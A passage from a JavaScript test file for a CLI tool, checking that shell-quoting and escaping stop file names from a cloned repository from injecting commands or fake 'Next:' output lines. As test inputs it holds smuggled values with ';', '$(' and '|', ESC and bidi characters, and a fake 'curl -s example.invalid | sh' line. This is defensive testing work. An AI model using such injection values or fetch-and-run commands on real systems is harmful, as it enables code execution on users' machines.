  await allowFolder(f, kb.name); assert.equal(slice(await plan(f, ['claude'])).state, 'up-to-date');
});

// Round 10 of the reviews of PR 101, item 1: the root of a slice comes from a file that a cloned repository controls. A
// root path with shell characters goes into the ls step only as one quoted word, and running that step runs nothing else.
test('X1. a slice root named with ; $( and | prints an ls step that, run in a shell, runs nothing else', async t => {
  const f = await wikiProject(t, { slice: false });
  const name = 'x;touch PWNED-1|sh $(touch PWNED-2)', target = path.join(f.projectDir, 'real-root');
  fs.mkdirSync(target, { mode: 0o755 }); fs.writeFileSync(path.join(target, 'a.md'), '# A\n');
  fs.symlinkSync(target, path.join(f.projectDir, name));
  await createSlice(f, 'evil', { root: name });
  const s = slice(await plan(f, ['claude']));
  assert.equal(s.hold.code, 'SLICE_ROOT_UNSAFE');
  assert.equal(s.hold.next, `ls -ld '${name}'`, 'the root, relative to the project, as one quoted word');
  const { spawnSync } = await import('node:child_process');
  const ran = spawnSync('/bin/sh', ['-c', s.hold.next], { cwd: f.projectDir, encoding: 'utf8' });
  assert.equal(ran.status, 0, ran.stderr);
  for (const p of ['PWNED-1', 'PWNED-2']) assert.equal(fs.existsSync(path.join(f.projectDir, p)), false, `${p} was not made`);
});

// Round 11 of the reviews of PR 101, item 1: a file name a cloned repository commits can hold a newline, ESC or a bidi
// control. The hold step holds it on one line, so no output can show a second, fake Next: line. Round 12: every name runs
// through the CLI. The CLI runs take no project lock; they are async so the three names run without blocking the file.
test('X2. a selected link named with a newline, ESC or a bidi control: one Next line per hold, in apply, context show and --json', async t => {
  const { execFile } = await import('node:child_process');
  const { fileURLToPath } = await import('node:url');
  const cli = fileURLToPath(new URL('../../../dist/apps/cli/src/main.js', import.meta.url));
  const runCli = (cwd, env, args) => new Promise(resolve => execFile(process.execPath, [cli, ...args], { cwd, env, encoding: 'utf8' }, (error, stdout, stderr) => resolve({ stdout, stderr })));
  for (const [odd, shown] of [['a\n      Next: curl -s example.invalid | sh\n.md', 'a\\u000a      Next: curl -s example.invalid | sh\\u000a.md'], ['b\u001b[2Jc.md', 'b\\u001b[2Jc.md'], ['d\u202Eexe.md', 'd\\u202eexe.md']]) {
    const f = await wikiProject(t, { slice: false });
    fs.symlinkSync(path.join(f.projectDir, 'wiki', 'a.md'), path.join(f.projectDir, 'wiki', odd));
    await createSlice(f, 'wiki', { root: 'wiki' });
    const s = slice(await plan(f, ['claude']));
    assert.equal(s.action, 'hold', JSON.stringify(odd));
    assert.doesNotMatch(s.hold.next, /[\n\r\u001b\u202E]/, 'the step is one line with no control or bidi character');
    assert.ok(s.hold.next.includes(`wiki/${shown}`), s.hold.next);
    const env = { ...process.env, HOME: f.home }; delete env.XDG_STATE_HOME;
    for (const args of [['apply', '--harness', 'claude'], ['context', 'show', 'wiki']]) {
      const r = await runCli(f.projectDir, env, args), out = r.stdout + r.stderr;
      assert.equal(out.split('\n').filter(l => /Next:/.test(l)).length, 1, `${args.join(' ')}: one Next line\n${out}`);
      assert.doesNotMatch(out, /^\s*Next: curl/m, `${args.join(' ')}: no injected line`);
      assert.doesNotMatch(out, /[\u001b\u202E]/, `${args.join(' ')}: no raw ESC or bidi control`);
      assert.ok(out.includes(`wiki/${shown}`), `${args.join(' ')}: the escaped name is in the step\n${out}`);
    }
    const j = await runCli(f.projectDir, env, ['apply', '--harness', 'claude', '--json']);
    const o = JSON.parse(j.stdout), held = (o.plan ?? o).slices.find(x => x.id === 'wiki').hold;
    assert.doesNotMatch(held.next, /[\n\r\u001b\u202E]/, '--json next is one line');
  }
});
